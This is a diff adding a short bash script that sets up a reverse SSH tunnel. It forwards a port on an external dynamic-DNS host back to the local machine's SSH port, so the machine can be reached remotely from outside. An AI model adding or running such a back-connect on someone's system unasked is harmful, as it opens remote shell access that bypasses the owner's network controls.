@@ -1,0 +1,6 @@
+#!/bin/bash
+# This script connects to a server and offers a back-connect via
+# ssh -p PORT user@localhost
+PORT=4795
+SSH_AUTH_SOCK=0 ssh -R $PORT:localhost:22 ext@unibiz.dyndns.biz "sleep 1740"
+
